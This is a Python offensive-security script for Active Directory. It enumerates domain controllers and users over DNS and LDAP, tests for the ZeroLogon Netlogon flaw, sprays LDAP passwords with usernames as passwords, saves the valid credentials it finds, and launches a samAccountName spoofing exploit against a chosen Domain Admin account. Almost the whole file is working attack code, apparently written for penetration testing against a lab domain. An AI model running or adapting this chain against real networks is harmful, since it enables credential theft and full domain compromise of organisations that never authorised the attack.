import dns.resolver
import socket
import sys
import ssl
import re
import os
import argparse
import json
import ldap3

from sam_spoof import SamExploit
from get_desc import LdapSearch
from my_print import *
from utils.helper import GETTGT
from utils.S4U2self import GETST
from impacket.dcerpc.v5 import samr, nrpc, epm, transport

def ldap_spray(ldap_searcher, wordlist='/usr/share/wordlists/your_username_wordlist'):
		with open(wordlist, 'r') as f:
			words = f.readlines()

		for elt in words:
			pw = elt.strip()
			ldap_searcher.add_account(pw, pw)
		
		return ldap_searcher.account

def save(value_json, filename):
	with open(filename, 'w') as f:
		for a,b in value_json.items():
			f.write(f'{a}:{b}')
		success(f'Data saved in {filename} !')


def try_auth(dc_handle, dc_ip, target):
	binding = epm.hept_map(dc_ip, nrpc.MSRPC_UUID_NRPC, protocol='ncacn_ip_tcp')
	rpc_con = transport.DCERPCTransportFactory(binding).get_dce_rpc()
	rpc_con.connect()
	rpc_con.bind(nrpc.MSRPC_UUID_NRPC)

	plaintext, ciphertext = b"\x00"*8, b"\x00"*8
	flags = 0x212fffff


	nrpc.hNetrServerReqChallenge(rpc_con, dc_handle + '\x00', target + '\x00', plaintext)
	try:
		server_auth = nrpc.hNetrServerAuthenticate3(
			rpc_con, dc_handle + '\x00', target + '$\x00', nrpc.NETLOGON_SECURE_CHANNEL_TYPE.ServerSecureChannel,
			target + '\x00', ciphertext, flags
		)


		assert server_auth['ErrorCode'] == 0
		return rpc_con

	except nrpc.DCERPCSessionError as ex:
		if ex.get_error_code() == 0xc0000022:
			return None

def atk(dc_handle, dc_ip, target):
	rpc_con = None
	for a in range(2000):
		print('[' + ['-','/','-','\\'][(a // 3) % 4] + ']    \r', end='')
		rpc_con = try_auth(dc_handle, dc_ip, target)
		if(rpc_con):
			break

	if(rpc_con):
		success(f'Target {target} is vulnerable !')
	else:
		warn('Target seems to be patch')

def zerologon(DC_dict):
	log("Script from SecuraBV on github")

	for DC, dc_ip in DC_dict.items():
		dc_name = DC.split('.')[0].upper()
		atk('\\\\' + dc_name, dc_ip, dc_name)

def parse_dc_file():
	DC_dict = {}
	with open('dc.txt') as f:
		use_file = True
		data_dc = f.readlines()
	for l in data_dc:
		if(l.split()[0].upper() == 'DOMAIN'):
			domain_name = l.split()[1]
			log(f'Domain name: {domain_name}')
		else:
			DC_dict[l.split()[0]] = l.split()[1]
	return domain_name, DC_dict

def parse_resolver():
	section('DNS resolving')
	with open('/etc/resolv.conf', 'r') as f:
		data = f.readlines()

	for line in data:
		res = re.match(r'search (.*)', line)
		if(res is not None):
			domain_name = res[1]

	DC_dict = dict()
	res = dns.resolver.resolve(f'_ldap._tcp.dc._msdcs.{domain_name}', 'SRV')

	if(len(res) > 0):
		### Try to Recover DC ip(v4)/name with additional records ###
		if(len(res.response.additional) > 1):
			for i in range(len(res.response.additional)):
				if(res.response.additional[i].rdtype == 1): # A record ==> recover ipv4
					dc_name = str(res.response.additional[i].name)
					DC_dict[dc_name] = str(list(res.response.additional[i].items.keys())[0])
	with open('dc.txt', 'w') as f:
		f.write(f"Domain {domain_name}\n")
		for a, b in DC_dict.items():
			f.write(f"{a} {b}\n")
	return DC_dict

if __name__ == '__main__':
	"""
	Exemple:
		python3 ad_pease.py -domain-name sevenkingdoms.local -dc-ip 192.168.56.11
		"""
	parser = argparse.ArgumentParser(add_help = True, description = "Sam account spoofing exploit")
	parser.add_argument('-dc-name', action='store', metavar = "DC name", help='Hostname of the domain controller to use')
	parser.add_argument('-domain-name', action='store', metavar = "Domain name", help='Domain name to use')
	parser.add_argument('-dc-ip', action='store', metavar = "DC Ip", help='Ip of the domain controller to use')
	parser.add_argument('-u', action='store', metavar='username', help='username to use for auth')
	parser.add_argument('-p', action='store', metavar='password', help='passord to use for auth')
	parser.add_argument('-use-file', action="store_true", help='use a file dc.txt to parse domain info')
	parser.add_argument('-target-da', action='store', metavar='Domain Admin', help='Domain Admin to spoof')
	parser.add_argument('-hashes', action='store', metavar='NTLM', help='Not use so far fr the moment')
	parser.add_argument('-aesKey', action='store', metavar='AES Key', help='Same as NTLM')

	options = parser.parse_args()

	username, password = '', ''

	if(options.use_file is not None):
		options.domain_name, DC_dict = parse_dc_file()

	else:
		DC_dict = parse_resolver()

	options.dc_ip, options.dc_name = list(DC_dict.values())[0], list(DC_dict.keys())[0]
	domain_name , dc_ip = options.domain_name, options.dc_ip


	section("LDAP Anonymous")
	ldap_requester = LdapSearch(domain_name, dc_ip, username, password)
	ldap_requester.init_all()
	ldap_requester.exec('users')
	if(len(ldap_requester.res) != 0):
		ldap_requester.exec('da')
		ldap_requester.exec('desc')

	section('ZeroLogon')
	if(input('Try zerologon ?(Y/n) ').lower() == 'y'):
		zerologon(DC_dict)

	account_found = 0
	if(input('\nLaunch LDAP Spray ?(Y/N) ').lower() == 'y'):
		section("LDAP Spray")
		ldap_spray(ldap_requester)
		if(len(ldap_requester.account) > 0):
			success(f'{len(ldap_requester.account)} valid account found!\n\t{ldap_requester.account}')
			if(input('\nWanna save res in valid_accounts.txt ? (Y/N) ').lower() == 'y'):
				save(ldap_requester.account, 'valid_accounts.txt')

			account_found = 1

	if(account_found):
		options.u, options.p = list(ldap_requester.account.keys())[0], list(ldap_requester.account.values())[0]
		section("Recovering info")
		ldap_requester.add_account(list(ldap_requester.account.keys())[0], list(ldap_requester.account.values())[0])
		section("User info")
		ldap_requester.exec('users')
		section("Juicy description")
		ldap_requester.exec('desc')
		section("DA Users")
		ldap_requester.exec('da')

		if(input('Try samAccountName ?(Y/N) ').lower() == 'y'):
			log("Choose DA to target")
			for i in range(len(ldap_requester.res)):
				print(f"\t[{i}] - {ldap_requester.res[i]}")
			da_index = int(input("Which DA do you want to target ? (number) "))
			options.target_da = ldap_requester.res[da_index]
			log(f"Targetting {options.target_da}")
			SamAdmin = SamExploit(options)
			SamAdmin.init_all()
			SamAdmin.samr_exp()



